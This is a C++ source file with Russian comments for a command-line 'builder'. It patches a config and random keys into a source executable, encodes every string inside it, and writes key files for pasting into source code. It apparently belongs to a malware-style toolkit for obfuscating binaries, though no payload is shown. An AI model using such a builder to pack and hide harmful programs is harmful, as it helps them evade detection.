// builder.cpp: определяет точку входа для консольного приложения.
//

#include "stdafx.h"
#include "core\core.h"
#include "core\file.h"
#include "core\rand.h"
#include "main.h"
#include <stdlib.h>

int _tmain(int argc, _TCHAR* argv[])
{
	WinAPI::Init();
	Core::Init();
	Rand::Init();
	if( argc != 4 )
	{
		printf( "ERROR: needed 3 params: [src.exe] [file config] [dst.exe]\n" );
		return 0;
	}
	const char* srcExe = argv[1];
	const char* fileConfig = argv[2];
	const char* dstExe = argv[3];
	srand( GetTickCount() );

	printf( "Reading config file: %s\n", fileConfig );

	Config* cfg = ReadConfig(fileConfig);
	if( cfg == 0 ) return 0;

	Mem::Data data;
	if( File::ReadAll( srcExe, data ) )
	{
		if( cfg->publicKey.Len() == 0 )
			printf( "ERROR: no public key\n" );
		printf( "Settings params ...\n" );
		SetRandVector( cfg, data );
		CreateEncodeTable(cfg);
		SetConfig( cfg, data );
		int count = EncodeAllStrings( cfg, data );
		printf( "Encode strings: %d\n", count );

		if( !File::Write( dstExe, data ) )
			printf( "ERROR: not create dst file %s\n", dstExe );

		File::Write( "public.key", cfg->publicKey );
		File::Write( "private.key", cfg->privateKey );
		//формируем текстовую строку с ключем, чтобы можно было вставить в исходник
		FILE* file = fopen( "public_key.txt", "w" );
		for( int i = 0; i < cfg->encodedKey.Len(); i++ )
		{
			fprintf( file, "\\x%02x", (uint)cfg->encodedKey.p_byte()[i] );
		}
		fclose(file);
	}
	else
	{
		printf( "ERROR: not open src file %s\n", srcExe );
	}
	delete cfg;

	return 0;
}

#ifdef ON_CODE_STRING

StringDecoded DECODE_STRING( const char* codeStr )
{
	char* s = Str::Duplication(codeStr);
	s += 2;
	s[ Str::Len(s) - 2 ] = 0;
	return StringDecoded(s);
}

#else

StringDecoded DECODE_STRING( const char* codeStr )
{
	char* s = Str::Duplication(codeStr);
	return StringDecoded(s);
}

#endif //ON_CODE_STRING
